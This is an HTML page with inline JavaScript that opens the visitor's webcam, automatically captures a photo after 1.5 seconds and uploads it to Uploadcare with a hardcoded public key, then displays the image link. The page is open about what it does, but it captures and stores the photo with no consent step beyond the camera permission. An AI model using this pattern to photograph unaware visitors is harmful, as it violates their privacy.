<!DOCTYPE html>
<html>
<head>
  <title>Auto Capture and Upload</title>
  <style>
    body {
      margin: 0;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    video {
      width: 300px;
      border-radius: 10px;
    }
    h2 {
      font-family: sans-serif;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <h2 id="status">Starting camera...</h2>

  <script>
    const video = document.getElementById('video');
    const status = document.getElementById('status');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);

          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('file', blob, 'photo.jpg');
            formData.append('UPLOADCARE_STORE', '1');
            formData.append('UPLOADCARE_PUB_KEY', 'cc243a8b7d6b1f1c4162'); // Replace this!

            fetch('https://upload.uploadcare.com/base/', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(data => {
              if (data && data.file) {
                const imageUrl = `https://ucarecdn.com/${data.file}/`;
                status.innerHTML = `<h2>Uploaded âœ…<br><a href="${imageUrl}" target="_blank">View Image</a></h2>`;
              } else {
                status.textContent = 'Upload failed';
              }
            });
          }, 'image/jpeg');
        }, 1500); // Auto-capture after 1.5 sec
      })
      .catch(err => {
        console.error(err);
        status.textContent = 'Camera not available or blocked';
      });
  </script>
</body>
</html>
